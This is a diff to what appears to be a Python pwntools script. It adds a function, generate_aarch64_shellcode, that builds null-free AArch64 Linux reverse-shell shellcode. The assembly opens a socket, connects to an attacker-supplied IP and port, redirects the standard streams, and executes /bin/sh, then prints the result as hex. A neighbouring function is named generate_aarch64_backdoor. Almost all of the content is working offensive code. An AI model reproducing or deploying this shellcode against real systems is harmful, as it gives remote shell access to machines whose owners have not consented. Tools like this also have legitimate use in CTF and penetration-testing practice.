@@ -35,4 +35,75 @@ def generate_aarch64_backdoor(reverse_ip,reverse_port,filename):
 		print "{} is ok in ./"
 
 def generate_aarch64_shellcode(reverse_ip,reverse_port):
-	pass
+	handle_port="0x"+enhex(p16(reverse_port))
+	handle_ip=list(reverse_ip.split('.'))
+	handle_ip_high=hex((int(handle_ip[1])<<8)+int(handle_ip[0]))
+	handle_ip_low=hex((int(handle_ip[3])<<8)+int(handle_ip[2]))
+	shellcode='''
+	mov x10,#0x100
+	sub x0,x10,#0xfe
+	sub x1,x10,#0xff
+	mov x2,xzr
+	mov x8,#0xc6
+	svc #0x1337
+	str x0,[sp,#-0x10]!
+	ldr x12,[sp]
+	sub x14,x10,#0xfe
+	movk x14,#%s,lsl #16
+	movk x14,#%s,lsl #32
+	movk x14,#%s, lsl #48
+	str x14, [sp,#-0x20]!
+	add x11,sp,#0x100
+	sub x1,x11,#0x100
+	mov x2,#0x10
+	mov x8,#0xcb
+	svc #0x1337
+	mov x0,x12
+	mov x1,xzr
+	mov x2,xzr
+	mov x8,#0x18
+	svc #0x1337
+	mov x0,x12
+	mov x10,#0x100
+	sub x1,x10,#0xff
+	svc #0x1337
+	mov x0,x12
+	sub x1,x10,#0xfe
+	svc #0x1337
+	mov     x14, #0x622f
+	movk    x14, #0x6e69, lsl #16
+	movk    x14, #0x732f, lsl #32
+	movk    x14, #0x68, lsl #48
+	str     x14, [sp, #-16]!
+	add     sp,sp,#0x100
+	sub     x0,sp,#0x100
+	sub     sp,sp,#0x100
+	mov     x14, #0x622f
+	movk    x14, #0x6e69, lsl #16
+	movk    x14, #0x732f, lsl #32
+	movk    x14, #0x68, lsl #48
+	str     x14, [sp, #-16]!
+	mov     x14, xzr
+	str     x14, [sp, #-0x10]!
+	mov     x14, #0x10
+	mov     x2, xzr
+	add     x14, sp, x14
+	stp     x2,x14,[sp,#-0x30]!
+	add     sp,sp,#0x100
+	sub     x1,sp,#0xf8
+	sub     sp,sp,#0x100
+	mov     x8, #0xdd 
+	svc     #0x1337
+	'''
+	shellcode=shellcode%(handle_port,handle_ip_high,handle_ip_low)
+	shellcode=asm(shellcode)
+	shellcode_hex=''
+	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
+	shellcode_len=len(shellcode)
+	if "\\x00" in shellcode_hex:
+		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
+		log.info("the null byte in %d"%shellcode.index("\x00"))
+		print shellcode_hex
+	else:
+		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
+		print shellcode_hex
